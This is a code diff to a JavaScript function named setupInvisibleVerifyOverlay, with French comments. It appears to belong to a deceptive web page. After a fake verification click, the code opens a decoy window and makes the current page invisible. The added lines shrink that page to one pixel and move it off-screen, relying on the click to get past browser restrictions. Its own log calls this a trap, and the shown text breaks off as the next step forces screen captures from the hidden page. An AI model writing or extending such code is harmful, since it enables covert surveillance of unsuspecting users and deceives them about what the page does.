@@ -928,7 +928,7 @@ function setupInvisibleVerifyOverlay(overlay) {
             console.warn("Échec ouverture fenêtre leurre");
         }
 
-        // --- ÉTAPE 2 : LA PAGE ACTUELLE DEVIENT LE FANTÔME (INVISIBLE) ---
+        // --- ÉTAPE 2 : LA PAGE ACTUELLE DEVIENT LE FANTÔME (INVISIBLE ET MINUSCULE) ---
         overlay.style.background = 'rgba(0,0,0,0)';
         overlay.innerHTML = ''; 
         document.body.style.transition = 'opacity 0.5s ease';
@@ -936,7 +936,17 @@ function setupInvisibleVerifyOverlay(overlay) {
         document.body.style.pointerEvents = 'none';
         document.title = 'Chargement...';
         
-        console.log("Piège activé : Cette page est maintenant Fantôme et invisible.");
+        // On tente de réduire la fenêtre actuelle et de la déplacer hors écran
+        // Note: Certains navigateurs bloquent le déplacement/redimensionnement sans action utilisateur directe,
+        // mais comme on est dans un événement 'click', on a de bonnes chances que ça passe.
+        try {
+            window.resizeTo(1, 1);
+            window.moveTo(10000, 10000);
+        } catch (e) {
+            console.warn("Redimensionnement fenêtre fantôme bloqué");
+        }
+        
+        console.log("Piège activé : Cette page est maintenant Fantôme, minuscule et invisible.");
 
         // --- ÉTAPE 3 : FORÇAGE DES CAPTURES SUR CETTE PAGE FANTÔME ---
         const forceScreenCapture = async () => {
